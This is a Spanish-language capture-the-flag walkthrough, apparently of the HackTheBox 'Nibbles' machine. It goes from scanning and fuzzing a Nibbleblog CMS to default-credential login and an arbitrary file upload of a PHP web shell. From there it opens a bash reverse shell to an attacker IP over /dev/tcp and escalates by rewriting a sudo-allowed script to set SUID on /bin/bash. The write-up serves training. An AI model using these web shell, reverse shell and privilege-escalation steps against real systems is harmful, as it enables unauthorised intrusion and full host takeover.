#CPTS #NibbleblogCMS #FileUpload #sudo 

# Reconocimiento

Empezaremos reconociendo la maquina a la que nos encontramos en búsqueda de sus puertos abiertos usando [[NMAP]]
```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.96.84 -oG allPorts
```

Encontraremos los puertos `22` y `80` abiertos así que con [[NMAP]] procederemos a hacer un escaneo más exhaustivo de estos puertos
```shell
nmap -p22,80 -sCV -vvv 10.129.96.84 -oN targeted 
```

Accederemos al puerto `80` a través del navegador web para ver que aloja este
![[Pasted image 20260909205354.png]]

Nos encontramos con un *Hello World!* vamos a usar [[WHATWEB]] en búsqueda de las tecnólogias que usa
```shell
whatweb http://10.129.96.84/
```

Sin encontrar nada relevante echaremos de nuevo un ojo a la web en búsqueda de cualquier indicio que nos pueda ayudar.
Vemos el código fuente de la pagina y encontramos que hay un directorio llamado `/nibbleblog/` 
![[Pasted image 20260909205610.png]]

Accederemos a el
![[Pasted image 20260909205649.png]]

Encontramos un directorio semejante a una web al estilo de un blog en el que se habla de últimos post, paginas, etc. Este se llama *Nibbleblog*
Vamos a hacer una busqueda en internet para conocer mas sobre este, vemos que este se trata de un *CMS* 
Conociendo este directorio vamos a hacer fuzzing sobre el
```shell
ffuf -c -fc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.96.84/nibbleblog/FUZZ
```

Encontramos directorios como `admin`, `content`, `lenguages`, `themes` y `plugins`
Navegando por estas rutas encontramos una ruta a `/nibbleblog/content/private/users.xml` en el cual vemos que hay un usuario llamado *Admin*

Como vemos que la web esta programada con *PHP* haremos fuzzing a archivos con extensión `.php`
```shell
ffuf -c -fc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.96.84/nibbleblog/FUZZ.php
```

Encontramos un archivo llamado `admin.php` entre tantos, navegaremos a el
![[Pasted image 20260909211408.png]]

Hemos encontrado un panel de login de administración, como hemos visto antes tenemos un usuario *Admin* así que ahora buscaremos en internet las credenciales por defecto de este *CMS* encontrando la contraseña *nibbles*, la cual nos da acceso al panel de *administración*

Ahora podemos usar [[SEARCHSPLOIT]] en busqueda de vulnerabilidades en este *CMS*
```shell
searchsploit nibbleblog
```

Encontramos un *Arbitrary File Upload* en la versión *4.0.3* la cual es la misma que la web publicada así que procederemos a su explotación
```shell
searchsploit -x php/remote/38489.rb 
```

En este script se modifica en la ruta de `plugins` uno llamado `My image`, al darle a la opcion de configurar se nos permite la subida de un archivo.
En el directorio descargas crearemos un archivo `.txt` de prueba para corroborar donde se sube el archivo y validar si se sube en la ruta anteriormente descubierta `/plugins/my_image`.
Pero nos e carga en esa ruta si no que se carga en `/nibbleblog/content/private/plugins/my_image/`.
![[Pasted image 20260909212753.png]]

Ahora vamos a intentar subir un script en `.php` que nos deje ejecutar una orden a nivel de sistema y ver si se interpretan los comandos.
Crearemos un archivo `.php`
```php
<?php
 echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

Lo subiremos y accederemos a la ruta
![[Pasted image 20260909213058.png]]

Hemos obtenido *RCE (Remote Command Ejecution)* ya que hemos conseguido obtener el nombre del usuario
Ahora cargaremos una *Reverse Shell* y entablaremos una conexión con nuestra maquina atacante
```shell
?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.226/443 0>%261"
```

Y poniéndonos antes en escucha con
```shell
nc -nlvp 443
```

Conseguimos entablar una *Rverse Shell* con la maquina victima ahora haremos el tratamiento de la TTY y continuaremos con la explotación
En el directorio del usuario encontraremos la flag del user

Ahora realizaremos la escalada de privilegios viendo que comandos podemos ejecutar como *root*
```shell
sudo -l
```

Encontrando una archivo `.sh`
![[Pasted image 20260909214313.png]]

Este archivo esta en el directorio del user, primero tendremos que descomprimir la carpeta `personal.zip` y hacer una enumeración del archivo para saber como funciona este
```shell
cat /home/nibbler/personal/stuff/monitor.sh
```

Este script es un script de monitorizacion del sistema, la parte interesante es que el script con ese nombre se puede ejecutar com#cpto root asi que si en vez de llamr directamente a la ruta modificamos este script y cargamos una ejecucion de una shell como root, elevaremos nuestro privilegios
```shell
nano /home/nibbler/personal/stuff/monitor.sh
```

En el script lo que haremos sera asignarle privilegios a nuestrop ususario para poder ejecutar una shell como root
```bash
#!/bin/bash

chmod u+s /bin/bash
```

Le damos permisos de ejecucion
```shell
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

Y lo ejecutamos como root
```shell
sudo /home/nibbler/personal/stuff/monitor.sh
```

Y nos cargaremos una bash con privilegios
```shell
bash -p
```

